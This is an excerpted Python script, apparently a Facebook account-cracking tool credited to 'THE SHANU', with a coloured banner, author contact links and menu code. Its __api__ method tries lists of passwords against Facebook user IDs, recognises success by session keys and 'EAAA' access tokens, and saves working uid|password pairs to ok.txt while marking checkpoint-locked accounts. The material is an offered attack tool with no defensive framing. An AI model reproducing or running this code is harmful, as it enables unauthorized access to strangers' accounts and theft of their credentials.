...
logo = """.d8888. db   db  .d8b.  d8b   db db    db
     88'  YP 88   88 d8' `8b 888o  88 88    88
     `Y8b. 88~~~88 88~~~88 88 V8o88 88    88
     db   8D 88   88 88   88 88  V888 88b  d88
     `8888Y' YP   YP YP   YP VP   V8P ~Y8888P' 
     888    888 888  888 888 888  888 888  888 

\033[1;97m______________________________________________________
\033[1;31m\033[1;37m Codded By \033[1;31m:\033[1;37m THE \033[1;37m(\033[1;32mSHANU\033[1;37m)|
\033[1;31m\033[1;37m Facebook  \033[1;31m:\033[1;37m SOLDIERSPD      |      \033[1;32m𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘
\033[1;31m\033[1;37m Whatsapp  \033[1;31m:\033[1;37m +923000375621   |     \033[1;32m𝐓𝐇𝐄 𝐒𝐇𝐀𝐍𝐔
\033[1;31m\033[1;37m Youtube   \033[1;31m:\033[1;37m TheShaNuxD    |
\033[1;97m______________________________________________________
"""
loop = 0
id = []
...
def main():
	...
	print('\033[1;97m[4] VISIT OFFICIAL PROFILE')
...
def Adi():
	...
	if input == '1':
		...
		os.system('xdg-open https://wa.me/+923000375621')
		main()
	elif input == '4':
		os.system("xdg-open https://www.facebook.com/soldierspd/")
		main()
...
class Shanu:
	...
	def __menu__(self):
		...
		print logo
		if choose in [""]:
			print(" \t\033[1;91m[!] SORRY WRONG CHOICE ")
			Shanu().__menu__()
		elif choose in ["1", "01"]:
			self.__fb__()
		elif choose in ["0", "00"]:
	...
	def __api__(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\033[1;97m[\033[1;92mShanu-OK\033[1;97m]\033[1;92m %s | %s\033[0;92m"%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\033[1;97m[\033[1;91mShanu-CP\033[1;97m] %s | %s\033[0;97m"%(uid, pw))
